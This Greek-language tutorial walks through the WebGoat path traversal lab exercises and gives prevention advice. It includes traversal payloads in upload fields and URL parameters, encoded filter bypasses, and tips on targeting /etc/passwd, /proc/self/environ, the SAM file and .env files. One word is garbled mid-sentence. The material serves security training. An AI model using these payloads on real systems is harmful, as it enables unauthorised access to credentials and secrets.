# Παράκαμψη Διαδρομής (Path Traversal)

## Μετάφραση στα Ελληνικά
Ο όρος **Path Traversal** μεταφράζεται στα Ελληνικά ως **"Διαδρομή Διάσχισης"** ή **"Παράκαμψη Διαδρομής"**. Πρόκειται για μια τεχνική επίθεσης που επιτρέπει σε έναν εισβολέα να αποκτήσει πρόσβαση σε αρχεία ή καταλόγους εκτός του προβλεπόμενου φακέλου, χειραγωγώντας την είσοδο που σχετίζεται με τη διαδρομή αρχείων (file path).

---

## Εκπαιδευτικό Υλικό για την Παράκαμψη Διαδρομής

Η παράκαμψη διαδρομής είναι μια ευπάθεια ασφαλείας που εμφανίζεται όταν μια εφαρμογή δεν ελέγχει σωστά την είσοδο του χρήστη, επιτρέποντας την πρόσβαση σε αρχεία ή καταλόγους εκτός του επιτρεπόμενου φακέλου. Αυτή η ενότητα παρέχει εκπαιδευτικό υλικό, εξηγήσεις και συμβουλές για την κατανόηση και την εκμετάλλευση αυτής της ευπάθειας.

### Βασικές Έννοιες
- **Παράκαμψη Διαδρομής**: Ο εισβολέας χρησιμοποιεί ειδικούς χαρακτήρες όπως `../` (για να ανέβει έναν κατάλογο) ή κωδικοποιημένες μορφές (π.χ., `%2E%2E%2F`) για να πλοηγηθεί σε μη εξουσιοδοτημένους καταλόγους.
- **Στόχος**: Πρόσβαση σε ευαίσθητα αρχεία (π.χ., αρχεία διαμόρφωσης, κωδικούς, μυστικά) ή τροποποίηση της δομής του συστήματος αρχείων.
- **Συνήθεις Εφαρμογές**: Ανέβασμα αρχείων, ανάκτηση αρχείων μέσω παραμέτρων URL, ή κακή διαχείριση ονομάτων αρχείων.

---

## Ανάλυση Μαθημάτων

### Μάθημα 2: Παράκαμψη Διαδρομής κατά το Ανέβασμα Αρχείων
**Περιγραφή**: Ο χρήστης ανεβάζει μια εικόνα προφίλ και μπορεί να χειραγωγήσει το πεδίο `fullName` για να αποθηκεύσει το αρχείο εκτός του προβλεπόμενου φακέλου `{username}`.

- **Είσοδος**:
  ```
  -----------------------------27260332916296986533744447080
  Content-Disposition: form-data; name="fullName"

  ../test
  ```
- **Εξήγηση**: Η τιμή `../test` επιτρέπει στον εισβολέα να ανέβει έναν κατάλογο πάνω από τον προβλεπόμενο φάκελο και να αποθηκεύσει το αρχείο σε έναν μη εξουσιοδοτημένο κατάλογο.
- **Ευπάθεια**: Η εφαρμογή δεν φιλτράρει ή δεν απολυμαίνει την είσοδο του χρήστη, επιτρέποντας την εισαγωγή χαρακτήρων `../`.

**Υπόδειξη**:
- Δοκιμάστε να χρησιμοποιήσετε πολλαπλά `../` για να πλοηγηθείτε σε βαθύτερους καταλόγους (π.χ., `../../../etc/passwd` σε συστήματα Linux).
- Ελέγξτε αν η εφαρμογή αποδέχεται εναλλακτικές κωδικοποιήσεις, όπως `%2E%2E%2F`.

---

### Μάθημα 3: Ατελής Απολύμανση Εισόδου
**Περιγραφή**: Η εφαρμογή προσπαθεί να απολυμάνει την είσοδο αντικαθιστώντας το `../` με κενό (`fullName.replace("../", "")`), αλλά η απολύμανση είναι ελλιπής.

- **Είσοδος**:
  ```
  -----------------------------22445278214949939952398157170
  Content-Disposition: form-data; name="fullNameFix"

  ....//test
  ```
- **Εξήγηση**: Ο εισβολέας χρησιμοποιεί `....//` για να παρακάμψει το φίλτρο. Μετά την αντικατάσταση του `../`, η διαδρομή μετατρέπεται σε `../test`, επιτρέποντας την παράκαμψη διαδρομής.
- **Ευπάθεια**: Η αντικατάσταση δεν λαμβάνει υπόψη παραλλαγές ή επαναλαμβανόμενα μοτίβα που μπορούν να παρακάμψουν το φίλτρο.

**Υπόδειξη**:
- Δοκιμάστε παραλλαγές όπως `..././` ή `..//..//` για να δείτε αν το φίλτρο μπορεί να παρακαμφθεί.
- Ελέγξτε για κωδικοποιήσεις όπως `%2E%2E%5C` (για `\` σε συστήματα Windows).

---

### Μάθημα 4: Χειραγώγηση Ονόματος Αρχείου
**Περιγραφή**: Ο εισβολέας χειραγωγεί το όνομα του αρχείου κατά το ανέβασμα για να αποθηκεύσει το αρχείο σε μη εξουσιοδοτημένο κατάλογο.

- **Είσοδος**:
  ```
  -----------------------------1740053938349190302459631647
  Content-Disposition: form-data; name="uploadedFileRemoveUserInput"; filename="../myfile.txt"
  Content-Type: text/plain
  ```
- **Εξήγηση**: Το όνομα του αρχείου περιλαμβάνrypted `../`, επιτρέποντας την αποθήκευση του αρχείου εκτός του προβλεπόμενου φακέλου.
- **Ευπάθεια**: Η εφαρμογή δεν ελέγχει ή δεν απολυμαίνει το όνομα του αρχείου που παρέχεται από τον χρήστη.

**Υπόδειξη**:
- Δοκιμάστε να χρησιμοποιήσετε απόλυτες διαδρομές (π.χ., `/etc/passwd` ή `C:\Windows\system.ini`) για να στοχεύσετε συγκεκριμένα αρχεία.
- Ελέγξτε αν η εφαρμογή επιτρέπει επεκτάσεις αρχείων που δεν περιμένει (π.χ., `.php` αντί για `.jpg`).

---

### Μάθημα 5: Ανάκτηση Αρχείων μέσω Παράκαμψης Διαδρομής
**Περιγραφή**: Η εφαρμογή επιτρέπει την ανάκτηση εικόνων μέσω μιας παραμέτρου `id` σε ένα αίτημα GET, αλλά είναι ευάλωτη σε παράκαμψη διαδρομής.

- **Αίτημα 1**:
  ```
  GET http://vernjan:8080/WebGoat/PathTraversal/random-picture?id=4.jpg
  ```
  **Απόκριση**: Επιστρέφει μια λίστα καταλόγων, αποκαλύπτοντας τη δομή του συστήματος αρχείων.

- **Αίτημα 2**:
  ```
  GET http://vernjan:8080/WebGoat/PathTraversal/random-picture?id=4
  ```
  **Απόκριση**: Επιστρέφει την εικόνα σε κωδικοποίηση base64.

- **Αίτημα 3**:
  ```
  GET http://vernjan:8080/WebGoat/PathTraversal/random-picture?id=../../path-traversal-secret
  ```
  **Απόκριση**: Επιστρέφει σφάλμα για "παράνομους χαρακτήρες".

- **Αίτημα 4**:
  ```
  GET http://vernjan:8080/WebGoat/PathTraversal/random-picture?id=%2E%2E%2F%2E%2E%2Fpath-traversal-secret
  ```
  **Απόκριση**: Επιτυχής ανάκτηση του αρχείου `path-traversal-secret.jpg`.

- **Τελικό Βήμα**:
  ```
  $ printf vernjan | sha512sum
  4c5aab6d6999943bac2b9e7acca349c0c7fce12761a4798062031a0f40a08a3f4011f3b09915f868fe7966c401316951b7669f5d54d3c67774e3a63c3040c9a6  -
  ```
  **Εξήγηση**: Ο χρήστης υπολογίζει το SHA-512 hash του ονόματός του (`vernjan`) για να ολοκληρώσει το μάθημα.

**Υπόδειξη**:
- Χρησιμοποιήστε κωδικοποίηση URL (π.χ., `%2E%2E%2F` για `../`) για να παρακάμψετε φίλτρα που εμποδίζουν χαρακτήρες όπως `.` ή `/`.
- Δοκιμάστε διαφορετικά αρχεία συστήματος, όπως `/etc/passwd` ή `C:\Windows\win.ini`, για να ελέγξετε την έκταση της ευπάθειας.
- Ελέγξτε για περιορισμούς μήκους ή φίλτρα που μπορεί να παρακαμφθούν με δημιουργικές διαδρομές.

---

## Συμβουλές για την Εκμετάλλευση και την Πρόληψη

### Συμβουλές Εκμετάλλευσης
1. **Παραλλαγές Διαδρομής**:
   - Χρησιμοποιήστε `../`, `..\\`, `..././`, ή κωδικοποιημένες μορφές όπως `%2E%2E%2F`.
   - Δοκιμάστε απόλυτες διαδρομές ή διαδρομές με διπλές κάθετους (`//`).
2. **Παράκαμψη Φίλτρων**:
   - Εάν το `../` φιλτράρεται, δοκιμάστε `....//` ή `..%2F`.
   - Χρησιμοποιήστε Unicode ή άλλες κωδικοποιήσεις για να παρακάμψετε φίλτρα.
3. **Εξερεύνηση Συστήματος**:
   - Στοχεύστε γνωστά αρχεία όπως `/etc/passwd`, `/proc/self/environ`, ή `C:\Windows\system32\config\sam`.
   - Ελέγξτε για αρχεία διαμόρφωσης ή κρυφά αρχεία (π.χ., `.env`, `.git`).

### Πρόληψη
1. **Απολύμανση Εισόδου**:
   - Ελέγξτε αυστηρά την είσοδο του χρήστη, επιτρέποντας μόνο εγκεκριμένους χαρακτήρες (π.χ., αλφαριθμητικούς).
   - Χρησιμοποιήστε λευκές λίστες αντί για μαύρες λίστες για την απολύμανση.
2. **Περιορισμός Πρόσβασης**:
   - Περιορίστε την πρόσβαση της εφαρμογής σε συγκεκριμένους καταλόγους χρησιμοποιώντας chroot ή περιορισμούς συστήματος αρχείων.
   - Αποθηκεύστε τα ανεβασμένα αρχεία σε βάση δεδομένων αντί για το σύστημα αρχείων.
3. **Ασφαλής Διαχείριση Αρχείων**:
   - Δημιουργήστε τυχαία ονόματα αρχείων αντί να χρησιμοποιείτε την είσοδο του χρήστη.
   - Ελέγξτε τον τύπο και το περιεχόμενο των αρχείων πριν την αποθήκευση.

---

## Επιπρόσθετοι Πόροι
- **OWASP Path Traversal**: https://owasp.org/www-community/attacks/Path_Traversal
- **WebGoat Tutorial**: Εξερευνήστε το WebGoat (https://owasp.org/www-project-webgoat/) για πρακτικές ασκήσεις.
- **PortSwigger Labs**: Δοκιμάστε τα εργαστήρια Path Traversal στο https://portswigger.net/web-security/file-path-traversal.

**Υπόδειξη για Πρακτική**:
- Ρυθμίστε ένα τοπικό περιβάλλον WebGoat για να εξασκηθείτε στις τεχνικές παράκαμψης διαδρομής.
- Χρησιμοποιήστε εργαλεία όπως το Burp Suite για να χειραγωγήσετε αιτήματα και να δοκιμάσετε παραλλαγές.
